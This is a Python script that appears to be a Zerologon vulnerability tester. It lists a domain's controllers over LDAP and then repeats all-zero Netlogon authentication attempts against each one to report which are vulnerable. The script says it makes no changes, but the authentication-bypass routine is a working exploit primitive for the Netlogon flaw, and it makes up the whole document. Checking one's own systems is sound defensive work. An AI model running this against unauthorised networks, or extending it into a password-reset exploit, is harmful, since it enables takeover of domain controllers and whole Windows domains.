#!/usr/bin/env python3

import ldap
import socket

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call
import getpass
import subprocess

LDAP_PORT = 389
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%


def get_domain_controllers_in_domain(domain):
    user = input("User:")
    password = getpass.getpass()
    l = ldap.initialize(f"ldap://{domain}:{LDAP_PORT}")
    try:
        l.bind_s(user, password)
    except:
        print(f"Couldn't bind with {user} to {domain}")
        sys.exit(1)

    # get all DCs in the domain
    base="OU=Domain Controllers" + ",dc=".join([" "] + domain.split("."))
    scope = ldap.SCOPE_SUBTREE
    attrs = ["DNShostname"]
    # we retrieve all the DCs in the domain using this filter
    filter = "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
    res = l.search_s(base, scope, filter, attrs)
    domain_controller_names = [r[1]['dNSHostName'][0].decode("utf-8") for r in res]
    print(f"The following domain controllers were found in {domain}: {domain_controller_names}")
    return domain_controller_names

def resolve_ip_from_dc_name(dc_name):
    return socket.getaddrinfo(dc_name, 80)[0][-1][0]

def fail(msg):
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
      # Connect to the DC's Netlogon service.
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
          rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
          target_computer + '\x00', ciphertext, flags
        )

        # It worked!
        assert server_auth['ErrorCode'] == 0
        return rpc_con

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
          return None
        else:
          fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
    print('Performing authentication attempts...')
    rpc_con = None
    for attempt in range(0, MAX_ATTEMPTS):
    # rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
        rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)

        if rpc_con == None:
            print('=', end='', flush=True)
        else:
            break

    if rpc_con:
        print('\nSuccess! {} can be fully compromised by a Zerologon attack.'.format(target_computer))
        return True
    else:
        print('\nAttack failed. Target is probably patched.')
        return False


if __name__ == '__main__':
  if not (len(sys.argv) == 2):
    print('Usage: zerologon_tester.py <domain name>')
    print('Find all the domain controllers in the domain and check which is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    sys.exit(1)
  else:
    [_, domain] = sys.argv

    dc_names = get_domain_controllers_in_domain(domain)
    if len(dc_names) == 0:
        print("Couldn't find any DC in the domain, please check the input")
        sys.exit(1)

    clean_dcs = []
    compromised_dcs = []

    for dc_name in dc_names:
        try:
            dc_ip = resolve_ip_from_dc_name(dc_name)
        except:
            print(f"Couldn't resolve ip for {dc_name}")
            continue

        print(f"testing {dc_name}, {dc_ip}")

        # remove the domain from the DC name for the test
        dc_name = dc_name.split(domain.upper())[0][:-1]
        if perform_attack('\\\\' + dc_name, dc_ip, dc_name) is True:
            compromised_dcs.append(dc_name)
        else:
            clean_dcs.append(dc_name)

    print(f"The DCs {compromised_dcs} are vulnerable to zerologon attack")
    print(f"The DCs {clean_dcs} are clean")
